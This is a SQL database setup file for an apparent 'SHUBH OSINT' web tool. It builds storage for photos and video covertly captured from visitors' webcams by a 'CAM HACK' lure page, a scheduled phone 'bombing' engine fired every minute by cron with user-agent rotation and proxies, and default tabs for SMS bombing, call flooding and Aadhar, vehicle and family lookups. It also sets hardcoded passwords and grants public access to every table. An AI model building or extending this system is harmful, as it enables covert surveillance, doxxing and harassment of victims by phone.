-- =====================================================
-- SHUBH OSINT - Complete Supabase Database Setup
-- =====================================================
-- Run this SQL in your new Supabase project's SQL Editor
-- Last Updated: 2026-03-08
-- Version: 5.2 (Premium System + IST Daily Limits)
-- =====================================================
-- NOTE: Credit system has been REMOVED. Authentication is now
-- handled by simple site password (stored in app_settings).
-- Tables: access_passwords, user_sessions, credit_usage are
-- LEGACY and no longer used by the application.
-- =====================================================

-- =====================================================
-- 1. CREATE TABLES
-- =====================================================

-- [LEGACY] Access Passwords Table (no longer used - kept for reference)
CREATE TABLE IF NOT EXISTS public.access_passwords (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  password_hash TEXT NOT NULL,
  password_display TEXT NOT NULL,
  total_credits INTEGER NOT NULL DEFAULT 0,
  remaining_credits INTEGER NOT NULL DEFAULT 0,
  is_enabled BOOLEAN NOT NULL DEFAULT true,
  is_used BOOLEAN NOT NULL DEFAULT false,
  is_unlimited BOOLEAN NOT NULL DEFAULT false,
  device_id TEXT,
  used_at TIMESTAMP WITH TIME ZONE,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- [LEGACY] User Sessions Table (no longer used)
CREATE TABLE IF NOT EXISTS public.user_sessions (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  password_id UUID NOT NULL REFERENCES public.access_passwords(id) ON DELETE CASCADE,
  device_id TEXT NOT NULL,
  session_token TEXT NOT NULL,
  is_active BOOLEAN NOT NULL DEFAULT true,
  last_active_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- [LEGACY] Credit Usage Table (no longer used)
CREATE TABLE IF NOT EXISTS public.credit_usage (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  password_id UUID NOT NULL REFERENCES public.access_passwords(id) ON DELETE CASCADE,
  credits_used INTEGER NOT NULL,
  search_type TEXT NOT NULL,
  search_query TEXT,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- App Settings Table (stores all app configuration)
CREATE TABLE IF NOT EXISTS public.app_settings (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  setting_key TEXT NOT NULL UNIQUE,
  setting_value JSONB NOT NULL,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- Captured Photos Table (stores photo data or URLs)
CREATE TABLE IF NOT EXISTS public.captured_photos (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  session_id TEXT NOT NULL,
  image_data TEXT NOT NULL,
  user_agent TEXT,
  ip_address TEXT,
  captured_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- Captured Videos Table (stores video URLs from storage)
CREATE TABLE IF NOT EXISTS public.captured_videos (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  session_id TEXT NOT NULL,
  video_url TEXT NOT NULL,
  duration_seconds INTEGER DEFAULT 5,
  user_agent TEXT,
  ip_address TEXT,
  captured_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- Search History Table (logs all searches)
CREATE TABLE IF NOT EXISTS public.search_history (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  search_type TEXT NOT NULL,
  search_query TEXT NOT NULL,
  ip_address TEXT,
  searched_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- Hit APIs Table (stores API configs for Hit Engine - v3.8)
CREATE TABLE IF NOT EXISTS public.hit_apis (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  name TEXT NOT NULL,
  url TEXT NOT NULL,
  method TEXT NOT NULL DEFAULT 'GET',
  headers JSONB NOT NULL DEFAULT '{}'::jsonb,
  body JSONB NOT NULL DEFAULT '{}'::jsonb,
  body_type TEXT NOT NULL DEFAULT 'json',
  query_params JSONB NOT NULL DEFAULT '{}'::jsonb,
  enabled BOOLEAN NOT NULL DEFAULT true,
  proxy_enabled BOOLEAN NOT NULL DEFAULT false,
  force_proxy BOOLEAN NOT NULL DEFAULT false,
  rotation_enabled BOOLEAN NOT NULL DEFAULT false,
  residential_proxy_enabled BOOLEAN NOT NULL DEFAULT false,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- Scheduled Hits Table (v4.0 - cron-based automated API hitting)
CREATE TABLE IF NOT EXISTS public.scheduled_hits (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  phone_number TEXT NOT NULL,
  start_time TIMESTAMP WITH TIME ZONE NOT NULL,
  interval_seconds INTEGER NOT NULL DEFAULT 60,
  max_rounds INTEGER DEFAULT 0,
  is_active BOOLEAN NOT NULL DEFAULT true,
  last_executed_at TIMESTAMP WITH TIME ZONE,
  next_execution_at TIMESTAMP WITH TIME ZONE,
  total_hits INTEGER NOT NULL DEFAULT 0,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- =====================================================
-- 2. ENABLE ROW LEVEL SECURITY
-- =====================================================

ALTER TABLE public.access_passwords ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.user_sessions ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.credit_usage ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.app_settings ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.captured_photos ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.captured_videos ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.search_history ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.hit_apis ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.scheduled_hits ENABLE ROW LEVEL SECURITY;

-- =====================================================
-- 3. RLS POLICIES
-- =====================================================

-- Access Passwords - No direct access (only via edge functions with service role)
DROP POLICY IF EXISTS "No direct access to passwords" ON public.access_passwords;
CREATE POLICY "No direct access to passwords" ON public.access_passwords
  AS RESTRICTIVE FOR ALL USING (false);

-- User Sessions - No direct access (only via edge functions)
DROP POLICY IF EXISTS "No direct access to sessions" ON public.user_sessions;
CREATE POLICY "No direct access to sessions" ON public.user_sessions
  AS RESTRICTIVE FOR ALL USING (false);

-- Credit Usage - No direct access (only via edge functions)
DROP POLICY IF EXISTS "No direct access to credit usage" ON public.credit_usage;
CREATE POLICY "No direct access to credit usage" ON public.credit_usage
  AS RESTRICTIVE FOR ALL USING (false);

-- App Settings - Public read/write (for settings sync across devices)
DROP POLICY IF EXISTS "Anyone can read settings" ON public.app_settings;
CREATE POLICY "Anyone can read settings" ON public.app_settings
  FOR SELECT TO public USING (true);

DROP POLICY IF EXISTS "Anyone can insert settings" ON public.app_settings;
CREATE POLICY "Anyone can insert settings" ON public.app_settings
  FOR INSERT TO public WITH CHECK (true);

DROP POLICY IF EXISTS "Anyone can update settings" ON public.app_settings;
CREATE POLICY "Anyone can update settings" ON public.app_settings
  FOR UPDATE TO public USING (true);

-- Captured Photos - Public access (PERMISSIVE for camera capture)
DROP POLICY IF EXISTS "Anyone can view captured photos" ON public.captured_photos;
CREATE POLICY "Anyone can view captured photos" ON public.captured_photos
  FOR SELECT TO public USING (true);

DROP POLICY IF EXISTS "Allow insert for photo capture" ON public.captured_photos;
CREATE POLICY "Allow insert for photo capture" ON public.captured_photos
  FOR INSERT TO public WITH CHECK (true);

DROP POLICY IF EXISTS "Anyone can delete captured photos" ON public.captured_photos;
CREATE POLICY "Anyone can delete captured photos" ON public.captured_photos
  FOR DELETE TO public USING (true);

-- Captured Videos - Public access (PERMISSIVE for video capture)
DROP POLICY IF EXISTS "Anyone can view captured videos metadata" ON public.captured_videos;
CREATE POLICY "Anyone can view captured videos metadata" ON public.captured_videos
  FOR SELECT TO public USING (true);

DROP POLICY IF EXISTS "Anyone can insert video metadata" ON public.captured_videos;
CREATE POLICY "Anyone can insert video metadata" ON public.captured_videos
  FOR INSERT TO public WITH CHECK (true);

DROP POLICY IF EXISTS "Anyone can delete video metadata" ON public.captured_videos;
CREATE POLICY "Anyone can delete video metadata" ON public.captured_videos
  FOR DELETE TO public USING (true);

-- Search History - Public access (view, insert, delete)
DROP POLICY IF EXISTS "Anyone can view search history" ON public.search_history;
CREATE POLICY "Anyone can view search history" ON public.search_history
  FOR SELECT TO public USING (true);

DROP POLICY IF EXISTS "Anyone can insert search history" ON public.search_history;
CREATE POLICY "Anyone can insert search history" ON public.search_history
  FOR INSERT TO public WITH CHECK (true);

DROP POLICY IF EXISTS "Anyone can delete search history" ON public.search_history;
CREATE POLICY "Anyone can delete search history" ON public.search_history
  FOR DELETE TO public USING (true);

-- Hit APIs - Public CRUD (admin-password protected in frontend)
DROP POLICY IF EXISTS "Anyone can read hit apis" ON public.hit_apis;
CREATE POLICY "Anyone can read hit apis" ON public.hit_apis
  FOR SELECT TO public USING (true);

DROP POLICY IF EXISTS "Anyone can insert hit apis" ON public.hit_apis;
CREATE POLICY "Anyone can insert hit apis" ON public.hit_apis
  FOR INSERT TO public WITH CHECK (true);

DROP POLICY IF EXISTS "Anyone can update hit apis" ON public.hit_apis;
CREATE POLICY "Anyone can update hit apis" ON public.hit_apis
  FOR UPDATE TO public USING (true);

DROP POLICY IF EXISTS "Anyone can delete hit apis" ON public.hit_apis;
CREATE POLICY "Anyone can delete hit apis" ON public.hit_apis
  FOR DELETE TO public USING (true);

-- Scheduled Hits - Public CRUD (for scheduled bombing feature)
DROP POLICY IF EXISTS "Anyone can read scheduled hits" ON public.scheduled_hits;
CREATE POLICY "Anyone can read scheduled hits" ON public.scheduled_hits
  FOR SELECT TO public USING (true);

DROP POLICY IF EXISTS "Anyone can insert scheduled hits" ON public.scheduled_hits;
CREATE POLICY "Anyone can insert scheduled hits" ON public.scheduled_hits
  FOR INSERT TO public WITH CHECK (true);

DROP POLICY IF EXISTS "Anyone can update scheduled hits" ON public.scheduled_hits;
CREATE POLICY "Anyone can update scheduled hits" ON public.scheduled_hits
  FOR UPDATE TO public USING (true);

DROP POLICY IF EXISTS "Anyone can delete scheduled hits" ON public.scheduled_hits;
CREATE POLICY "Anyone can delete scheduled hits" ON public.scheduled_hits
  FOR DELETE TO public USING (true);

-- =====================================================
-- 4. STORAGE BUCKETS
-- =====================================================

-- Create storage bucket for captured videos
INSERT INTO storage.buckets (id, name, public)
VALUES ('captured-videos', 'captured-videos', true)
ON CONFLICT (id) DO NOTHING;

-- Create storage bucket for captured photos
INSERT INTO storage.buckets (id, name, public)
VALUES ('captured-photos', 'captured-photos', true)
ON CONFLICT (id) DO NOTHING;

-- Create storage bucket for backgrounds and logos
INSERT INTO storage.buckets (id, name, public)
VALUES ('backgrounds', 'backgrounds', true)
ON CONFLICT (id) DO NOTHING;

-- =====================================================
-- 5. STORAGE POLICIES
-- =====================================================

-- Storage policies for captured-videos bucket
DROP POLICY IF EXISTS "Anyone can view captured videos" ON storage.objects;
CREATE POLICY "Anyone can view captured videos" ON storage.objects
  FOR SELECT USING (bucket_id = 'captured-videos');

DROP POLICY IF EXISTS "Anyone can upload captured videos" ON storage.objects;
CREATE POLICY "Anyone can upload captured videos" ON storage.objects
  FOR INSERT WITH CHECK (bucket_id = 'captured-videos');

DROP POLICY IF EXISTS "Anyone can delete captured videos" ON storage.objects;
CREATE POLICY "Anyone can delete captured videos" ON storage.objects
  FOR DELETE USING (bucket_id = 'captured-videos');

-- Storage policies for captured-photos bucket
DROP POLICY IF EXISTS "Public can view captured photos" ON storage.objects;
CREATE POLICY "Public can view captured photos" ON storage.objects
  FOR SELECT USING (bucket_id = 'captured-photos');

DROP POLICY IF EXISTS "Anyone can upload captured photos" ON storage.objects;
CREATE POLICY "Anyone can upload captured photos" ON storage.objects
  FOR INSERT WITH CHECK (bucket_id = 'captured-photos');

DROP POLICY IF EXISTS "Anyone can delete captured photos" ON storage.objects;
CREATE POLICY "Anyone can delete captured photos" ON storage.objects
  FOR DELETE USING (bucket_id = 'captured-photos');

-- Storage policies for backgrounds bucket
DROP POLICY IF EXISTS "Public can view backgrounds" ON storage.objects;
CREATE POLICY "Public can view backgrounds" ON storage.objects
  FOR SELECT USING (bucket_id = 'backgrounds');

DROP POLICY IF EXISTS "Anyone can upload backgrounds" ON storage.objects;
CREATE POLICY "Anyone can upload backgrounds" ON storage.objects
  FOR INSERT WITH CHECK (bucket_id = 'backgrounds');

DROP POLICY IF EXISTS "Anyone can update backgrounds" ON storage.objects;
CREATE POLICY "Anyone can update backgrounds" ON storage.objects
  FOR UPDATE USING (bucket_id = 'backgrounds');

DROP POLICY IF EXISTS "Anyone can delete backgrounds" ON storage.objects;
CREATE POLICY "Anyone can delete backgrounds" ON storage.objects
  FOR DELETE USING (bucket_id = 'backgrounds');

-- =====================================================
-- 6. FUNCTIONS AND TRIGGERS
-- =====================================================

-- Update timestamp function
CREATE OR REPLACE FUNCTION public.update_updated_at_column()
RETURNS TRIGGER AS $$
BEGIN
  NEW.updated_at = now();
  RETURN NEW;
END;
$$ LANGUAGE plpgsql SET search_path = public;

-- Trigger for app_settings
DROP TRIGGER IF EXISTS update_app_settings_updated_at ON public.app_settings;
CREATE TRIGGER update_app_settings_updated_at
  BEFORE UPDATE ON public.app_settings
  FOR EACH ROW
  EXECUTE FUNCTION public.update_updated_at_column();

-- Trigger for access_passwords
DROP TRIGGER IF EXISTS update_access_passwords_updated_at ON public.access_passwords;
CREATE TRIGGER update_access_passwords_updated_at
  BEFORE UPDATE ON public.access_passwords
  FOR EACH ROW
  EXECUTE FUNCTION public.update_updated_at_column();

-- Trigger for hit_apis
DROP TRIGGER IF EXISTS update_hit_apis_updated_at ON public.hit_apis;
CREATE TRIGGER update_hit_apis_updated_at
  BEFORE UPDATE ON public.hit_apis
  FOR EACH ROW
  EXECUTE FUNCTION public.update_updated_at_column();

-- Trigger for scheduled_hits
DROP TRIGGER IF EXISTS update_scheduled_hits_updated_at ON public.scheduled_hits;
CREATE TRIGGER update_scheduled_hits_updated_at
  BEFORE UPDATE ON public.scheduled_hits
  FOR EACH ROW
  EXECUTE FUNCTION public.update_updated_at_column();

-- =====================================================
-- 7. INDEXES (for better query performance)
-- =====================================================

CREATE INDEX IF NOT EXISTS idx_app_settings_key ON public.app_settings(setting_key);
CREATE INDEX IF NOT EXISTS idx_captured_photos_session ON public.captured_photos(session_id);
CREATE INDEX IF NOT EXISTS idx_captured_photos_date ON public.captured_photos(captured_at);
CREATE INDEX IF NOT EXISTS idx_captured_videos_session ON public.captured_videos(session_id);
CREATE INDEX IF NOT EXISTS idx_captured_videos_date ON public.captured_videos(captured_at);
CREATE INDEX IF NOT EXISTS idx_search_history_type ON public.search_history(search_type);
CREATE INDEX IF NOT EXISTS idx_search_history_date ON public.search_history(searched_at);
CREATE INDEX IF NOT EXISTS idx_access_passwords_hash ON public.access_passwords(password_hash);
CREATE INDEX IF NOT EXISTS idx_user_sessions_token ON public.user_sessions(session_token);
CREATE INDEX IF NOT EXISTS idx_user_sessions_password ON public.user_sessions(password_id);
CREATE INDEX IF NOT EXISTS idx_credit_usage_password ON public.credit_usage(password_id);
CREATE INDEX IF NOT EXISTS idx_credit_usage_date ON public.credit_usage(created_at);
CREATE INDEX IF NOT EXISTS idx_hit_apis_enabled ON public.hit_apis(enabled);
CREATE INDEX IF NOT EXISTS idx_hit_apis_name ON public.hit_apis(name);
CREATE INDEX IF NOT EXISTS idx_scheduled_hits_active ON public.scheduled_hits(is_active);
CREATE INDEX IF NOT EXISTS idx_scheduled_hits_next ON public.scheduled_hits(next_execution_at);
CREATE INDEX IF NOT EXISTS idx_scheduled_hits_phone ON public.scheduled_hits(phone_number);

-- =====================================================
-- 8. REALTIME
-- =====================================================

-- Enable realtime for hit_apis table (live sync across clients)
ALTER PUBLICATION supabase_realtime ADD TABLE public.hit_apis;

-- =====================================================
-- 9. DEFAULT DATA
-- =====================================================

-- Main Settings (includes admin password, session ID, search tabs, CALL DARK, etc.)
INSERT INTO public.app_settings (setting_key, setting_value)
VALUES ('main_settings', '{
  "sitePassword": "dark",
  "adminPassword": "dark",
  "theme": "dark",
  "headerName1": "SHUBH",
  "headerName2": "OSINT",
  "headerIcon": "Zap",
  "headerCustomLogo": "",
  "headerColor1": "green",
  "headerColor2": "pink",
  "headerFont": "Orbitron",
  "headerStyle": "normal",
  "darkDbUrl": "https://shubhinfo.vercel.app/",
  "darkDbHeight": "70",
  "darkDbBorderColor": "purple",
  "darkDbBorderWidth": "2",
  "backgroundImage": "",
  "backgroundOpacity": "30",
  "camSessionId": "shubhcam01",
  "camRedirectUrl": "https://google.com",
  "customCaptureHtml": "",
  "chromeCustomHtml": "",
  "camIframeUrl": "",
  "camPhotoLimit": 0,
  "camCaptureInterval": 500,
  "camVideoDuration": 5,
  "camCountdownTimer": 5,
  "camAutoRedirect": true,
  "camQuality": 0.8,
  "allSearchAccessKey": "darkosint",
  "telegramOsintAccessKey": "darkosint",
  "sitePasswordEnabled": true,
  "allSearchKeyEnabled": true,
  "telegramKeyEnabled": true,
  "creditSystemEnabled": false,
  "page2MusicUrl": "",
  "mainPageMusicUrl": "/audio/background-music.mp3",
  "tabSize": "small",
  "callDarkEnabled": true,
  "callDarkApiKey": "",
  "callDarkAgentId": "",
  "callDarkMaxDuration": 20,
  "headerBorderEnabled": true,
  "tabContainerBorderEnabled": true,
  "qrSize": 180,
  "qrFgColor": "#22c55e",
  "qrBgColor": "#000000",
  "qrIncludeLogo": false,
  "loaderImageUrl": "",
  "dashboardTheme": "cyber-grid",
  "tabs": [
    {"id": "phone", "label": "Phone", "icon": "Phone", "color": "green", "placeholder": "Enter phone number...", "searchType": "phone", "apiUrl": "", "enabled": true},
    {"id": "numinfov2", "label": "NUM INFO V2", "icon": "Search", "color": "cyan", "placeholder": "Enter phone number...", "searchType": "numinfov2", "apiUrl": "", "enabled": true},
    {"id": "aadhar", "label": "Aadhar", "icon": "CreditCard", "color": "pink", "placeholder": "Enter Aadhar number...", "searchType": "aadhar", "apiUrl": "", "enabled": true},
    {"id": "vehicle", "label": "Vehicle", "icon": "Car", "color": "orange", "placeholder": "Enter RC number...", "searchType": "vehicle", "apiUrl": "https://darknagi-osint-vehicle-api.vercel.app/api/vehicle?rc=", "enabled": true},
    {"id": "instagram", "label": "Instagram", "icon": "Camera", "color": "cyan", "placeholder": "Enter username...", "searchType": "instagram", "apiUrl": "", "enabled": true},
    {"id": "family", "label": "Family", "icon": "Users", "color": "purple", "placeholder": "Enter name/number...", "searchType": "family", "apiUrl": "", "enabled": true},
    {"id": "manual", "label": "Manual", "icon": "ClipboardPaste", "color": "yellow", "placeholder": "Enter number...", "searchType": "manual", "apiUrl": "https://hydrashop.in.net/number.php?q=", "enabled": true},
    {"id": "shubh", "label": "CAM HACK", "icon": "Sparkles", "color": "white", "placeholder": "", "searchType": "shubh", "apiUrl": "", "enabled": true},
    {"id": "darkdb", "label": "Webcam 360", "icon": "Globe", "color": "teal", "placeholder": "", "searchType": "darkdb", "apiUrl": "https://2info.vercel.app", "enabled": true},
    {"id": "telegram", "label": "Telegram OSI", "icon": "Send", "color": "blue", "placeholder": "", "searchType": "telegram", "apiUrl": "", "enabled": true},
    {"id": "allsearch", "label": "All Search", "icon": "Globe", "color": "red", "placeholder": "Enter phone / email / name...", "searchType": "allsearch", "apiUrl": "https://lek-steel.vercel.app/api/search?q=", "enabled": true},
    {"id": "tgtonum", "label": "Tg To Num", "icon": "MessageCircle", "color": "lime", "placeholder": "Enter Telegram username...", "searchType": "tgtonum", "apiUrl": "", "enabled": true},
    {"id": "randipanel", "label": "RANDI PANEL", "icon": "Skull", "color": "red", "placeholder": "", "searchType": "randipanel", "apiUrl": "", "enabled": true},
    {"id": "smsbomber", "label": "SMS BOMBER", "icon": "Bomb", "color": "orange", "placeholder": "", "searchType": "smsbomber", "apiUrl": "", "enabled": true},
    {"id": "calldark", "label": "CALL DARK", "icon": "PhoneCall", "color": "purple", "placeholder": "", "searchType": "calldark", "apiUrl": "", "enabled": true},
    {"id": "imagetoinfo", "label": "Image to Info", "icon": "Camera", "color": "pink", "placeholder": "", "searchType": "imagetoinfo", "apiUrl": "", "enabled": true}
  ],
  "telegramOsint": {
    "jwtToken": "",
    "baseUrl": "https://funstat.info",
    "tools": [
      {"id": "basic_info", "label": "BASIC INFO", "enabled": true, "cost": "0.10 credit"},
      {"id": "groups", "label": "GROUPS", "enabled": true, "cost": "5 credits"},
      {"id": "group_count", "label": "GROUP COUNT", "enabled": true, "cost": "FREE"},
      {"id": "messages_count", "label": "MESSAGES COUNT", "enabled": true, "cost": "FREE"},
      {"id": "messages", "label": "MESSAGES (LIMITED)", "enabled": true, "cost": "10 credits"},
      {"id": "stats_min", "label": "BASIC STATS", "enabled": true, "cost": "FREE"},
      {"id": "stats", "label": "FULL STATS", "enabled": true, "cost": "1 credit"},
      {"id": "reputation", "label": "REPUTATION", "enabled": true, "cost": "FREE"},
      {"id": "resolve_username", "label": "USERNAME RESOLVE", "enabled": true, "cost": "0.10 credit"},
      {"id": "username_usage", "label": "USERNAME USAGE", "enabled": true, "cost": "0.1 credit"},
      {"id": "usernames", "label": "USERNAMES HISTORY", "enabled": true, "cost": "3 credits"},
      {"id": "names", "label": "NAMES HISTORY", "enabled": true, "cost": "3 credits"},
      {"id": "stickers", "label": "STICKERS", "enabled": true, "cost": "1 credit"},
      {"id": "common_groups", "label": "COMMON GROUPS", "enabled": true, "cost": "5 credits"}
    ]
  }
}'::jsonb)
ON CONFLICT (setting_key) DO NOTHING;

-- Hit Site Settings (customizable labels for Quick Hit Engine)
INSERT INTO public.app_settings (setting_key, setting_value)
VALUES ('hit_site_settings', '{
  "siteName": "SHUBH OSINT",
  "adminButtonText": "SETTING",
  "warningText": "Sirf authorized testing aur educational purpose ke liye.",
  "quickHitTitle": "QUICK HIT",
  "phoneLabel": "Phone Number",
  "phonePlaceholder": "91XXXXXXXXXX",
  "hitButtonText": "START",
  "stopButtonText": "STOP",
  "noApisWarning": "Admin me APIs add karo pehle.",
  "adminPanelTitle": "ADMIN PANEL",
  "logoutButtonText": "LOGOUT",
  "disclaimerTitle": "DISCLAIMER",
  "disclaimerText": "Yeh tool sirf authorized testing aur educational purpose ke liye hai. Unauthorized use strictly prohibited.",
  "apiListTitle": "API List",
  "addApiButtonText": "Add",
  "noApisText": "No APIs added yet.",
  "logoUrl": "",
  "adminPassword": "dark",
  "residentialProxyUrl": "",
  "uaRotationEnabled": true,
  "enterNumberLabel": "Enter Number:",
  "apisActiveText": "APIs Active",
  "sequentialLabel": "Sequential",
  "parallelLabel": "Parallel",
  "scheduleLabel": "Schedule",
  "hittingApisText": "Hitting APIs...",
  "copyrightText": "© 2026 {TITLE} | All Rights Reserved",
  "roundLabel": "Round",
  "hitsLabel": "Hits",
  "okLabel": "OK",
  "failLabel": "Fail"
}'::jsonb)
ON CONFLICT (setting_key) DO NOTHING;

-- =====================================================
-- EDGE FUNCTIONS LIST (deploy from supabase/functions/)
-- =====================================================
-- Version 5.1 Edge Functions:
-- [LEGACY - no longer used by app]:
-- 1.  auth-login              - (LEGACY) User login with credit password
-- 2.  auth-verify             - (LEGACY) Verify session token & get credits
-- 3.  credits-deduct          - (LEGACY) Deduct credits for search operations
-- 4.  admin-passwords         - (LEGACY) Admin CRUD for password management
--
-- Active Edge Functions:
-- 5.  aadhar-search           - Aadhar lookup API
-- 6.  numinfo-v2              - Phone number info API
-- 7.  telegram-osint          - Telegram OSINT API integration
-- 8.  call-dark               - Omnidim AI call dispatch API
-- 9.  hit-api                 - API Hit Engine with UA rotation
-- 10. image-to-info           - Image analysis API
-- 11. execute-scheduled-hits  - Cron-based scheduled bombing executor
-- 12. fast-hit-all            - Hit ALL enabled APIs (Pro API style)
-- 13. telegram-bot            - Telegram Bot webhook handler (v5.1)
--
-- IMPORTANT CHANGES in v4.4:
-- - CORS FIX: All edge functions now include extended CORS headers:
--   Access-Control-Allow-Headers includes:
--   authorization, x-client-info, apikey, content-type,
--   x-supabase-client-platform, x-supabase-client-platform-version,
--   x-supabase-client-runtime, x-supabase-client-runtime-version
--   This fixes login/API failures on Vercel deployments with newer
--   @supabase/supabase-js versions that send additional headers.
-- - Quick Hit Engine: All UI labels now customizable via admin settings
--   (Enter Number, APIs Active, Sequential/Parallel/Schedule,
--    Round/Hits/OK/Fail, Hitting APIs, Copyright text)
-- - hit_site_settings added to app_settings for Hit Engine label sync
-- - Image to Info tab added to default tab config
--
-- IMPORTANT CHANGES in v4.3:
-- - fast-hit-all API restructured to match professional API style
-- - New parameters: phone, rounds, batch, delay (seconds), timeout (seconds)
--   Example: ?phone=9876543210&rounds=5&batch=5&delay=2&timeout=15
-- - Per-API 15s timeout (customizable 3-30s) — slow API won't block others
-- - Auto-retry (1 time) with 500ms delay on timeout/5xx errors
-- - Browser-like headers (Origin, Referer, Cache-Control, Accept) auto-added
-- - Non-blocking logging — response returned first, logs saved in background
-- - cURL copy button added in dashboard alongside POST & GET
-- - Settings sync architecture: all admin settings stored in app_settings DB
-- - Password protection fixed: waits for backend before showing lock screen
-- - /page3 route now protected with ProtectedRoute wrapper
--
-- IMPORTANT CHANGES in v4.2:
-- - fast-hit-all Edge Function: Hits all enabled APIs with single POST call
-- - Batch processing (5 APIs per batch) to avoid edge function timeout
-- - Secret key authentication via URL parameter (?key=YOUR_SECRET_KEY)
-- - Configurable rounds (max 50), {PHONE} placeholder replacement
-- - Rate limiting: 5 requests per IP per minute
-- - Admin panel: FastApiKeyManager for secret key + copy POST URL
--
-- IMPORTANT CHANGES in v4.1:
-- - Full Neon Theme: pure black background, neon glow effects
-- - Header: rainbow running border + color-cycling logo text
-- - Tab grid: color-changing running border animation
-- - Feature cards: neon color-specific glow variants
-- - Logs panel: terminal-style neon green/red logs
-- - All components: neon text-shadow, backdrop-blur effects
--
-- IMPORTANT CHANGES in v4.0:
-- - scheduled_hits table for cron-based automated API hitting
-- - execute-scheduled-hits edge function for background execution
-- - pg_cron + pg_net integration for server-side scheduling
-- =====================================================

-- =====================================================
-- EDGE FUNCTION CORS HEADERS (CRITICAL - v4.4)
-- =====================================================
-- ALL edge functions MUST use this CORS header format:
--
-- const corsHeaders = {
--   'Access-Control-Allow-Origin': '*',
--   'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version',
-- };
--
-- Without these extended headers, newer @supabase/supabase-js versions
-- will fail CORS preflight on Vercel/custom domain deployments.
-- =====================================================

-- =====================================================
-- 10. PG_CRON SETUP (for Scheduled Hits)
-- =====================================================
-- IMPORTANT: Enable pg_cron and pg_net extensions first from
-- Supabase Dashboard > Database > Extensions
-- Then run this SQL to create the cron job:

-- Enable extensions
CREATE EXTENSION IF NOT EXISTS pg_cron;
CREATE EXTENSION IF NOT EXISTS pg_net;

-- Create cron job that calls execute-scheduled-hits every minute
-- REPLACE <YOUR-PROJECT-REF> with your Supabase project ref (e.g., abcdefghijklmnop)
-- REPLACE <YOUR-ANON-KEY> with your Supabase anon/public key
SELECT cron.schedule(
  'execute-scheduled-hits-every-minute',
  '* * * * *',
  $$
  SELECT net.http_post(
    url := 'https://<YOUR-PROJECT-REF>.supabase.co/functions/v1/execute-scheduled-hits',
    headers := '{"Content-Type": "application/json", "Authorization": "Bearer <YOUR-ANON-KEY>"}'::jsonb,
    body := '{}'::jsonb
  ) AS request_id;
  $$
);

-- =====================================================
-- 11. FAST-HIT-ALL API REFERENCE (v4.3)
-- =====================================================
-- GET:  /functions/v1/fast-hit-all?phone=9876543210&rounds=5&batch=5&delay=2&timeout=15&key=SECRET
-- POST: /functions/v1/fast-hit-all?key=SECRET
--       Body: {"phone":"9876543210","rounds":5,"batch":5,"delay":2,"timeout":15}
--
-- Parameters:
-- | Param   | Type   | Default | Range  | Description                    |
-- |---------|--------|---------|--------|--------------------------------|
-- | phone   | string | -       | 10+    | Target phone number (required) |
-- | rounds  | int    | 1       | 1-50   | Number of hit rounds           |
-- | batch   | int    | 5       | 1-20   | APIs per batch (simultaneous)  |
-- | delay   | float  | 2       | 0-60   | Seconds between rounds         |
-- | timeout | float  | 15      | 3-30   | Per-API timeout in seconds     |
-- | key     | string | -       | -      | Secret key (if configured)     |
--
-- Features:
-- - Auto-retry (1x) on timeout or 5xx errors with 500ms delay
-- - Browser-like headers (Origin, Referer, Cache-Control, Accept)
-- - User-Agent rotation across 5 browser profiles
-- - Non-blocking logging (response returns immediately)
-- - Rate limit: 5 requests per IP per minute

-- =====================================================
-- QUICK REFERENCE: Tables & Their Purpose
-- =====================================================
-- access_passwords  : [LEGACY] Stores login credentials with credit info
-- user_sessions     : [LEGACY] Active login sessions tracking
-- credit_usage      : [LEGACY] Logs all credit deductions
-- app_settings      : Global app configuration (JSON)
--                     - main_settings: All admin settings synced across devices
--                     - hit_site_settings: Quick Hit Engine customizable labels
--                     - fast_api_secret_key: for fast-hit-all auth
--                     - tgbot_admin_ids: Telegram bot admin user IDs (array)
--                     - tgbot_config: Bot defaults (dailyLimit, defaultRounds, defaultBatch, defaultDelay)
--                     - tgbot_cf_workers: CF Worker URLs for load-balanced proxy (array)
--                     - tgbot_premium_users: Premium user plans + expiry (object)
--                     - tgbot_global_stats: totalHits, totalUsers counters
--                     - tgbot_all_users: All user chat IDs for broadcast (array)
--                     - tgbot_access_keys: Access key passwords (array)
--                     - tgbot_state_{chatId}: Per-user bot state (running, phone, runId, etc.)
